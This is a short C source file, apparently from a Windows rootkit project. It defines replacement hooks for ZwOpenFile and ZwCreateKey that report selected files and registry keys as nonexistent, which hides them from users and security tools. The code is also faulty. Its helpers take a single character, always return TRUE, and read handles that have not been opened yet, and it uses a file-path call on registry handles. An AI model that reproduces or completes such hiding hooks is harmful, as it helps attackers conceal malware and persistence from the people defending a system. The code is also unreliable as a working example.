#include "stdafx.h"
#include "ZwOpenFile.h"

BOOL mustHideFile(TCHAR filePath) {
	return TRUE; // TODO check la fin de la string avec des constantes
}

BOOL mustHideReg(TCHAR filePath) {
	return TRUE; // TODO check la fin de la string avec des constantes
}

NTSTATUS NTAPI NewZwOpenFile(
	PHANDLE				phFile,
	ACCESS_MASK			DesiredAccess,
	POBJECT_ATTRIBUTES	ObjectAttributes,
	PIO_STATUS_BLOCK	IoStatusBlock,
	ULONG				ShareAccess,
	ULONG				OpenOptions)
{
	TCHAR sPath[MAX_PATH];
	DWORD dwRet;
	
	dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);

	if (!mustHideFile(sPath))
		return ZwOpenFile(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
	return STATUS_NO_SUCH_FILE;
}

NTSTATUS NTAPI NewZwCreateKey(
	PHANDLE				KeyHandle,
	ACCESS_MASK			DesiredAccess,
	POBJECT_ATTRIBUTES	ObjectAttributes,
	ULONG				TitleIndex,
	PUNICODE_STRING		Class,
	ULONG				CreateOptions,
	PULONG				Disposition)
{
	TCHAR sPath[MAX_PATH];
	DWORD dwRet;
	
	dwRet = GetFinalPathNameByHandle(*KeyHandle, sPath, MAX_PATH, VOLUME_NAME_NONE);

	if (!mustHideReg(sPath))
		return ZwCreateKey(KeyHandle, DesiredAccess, ObjectAttributes, TitleIndex, Class, CreateOptions, Disposition);
	return STATUS_NO_SUCH_FILE;
}
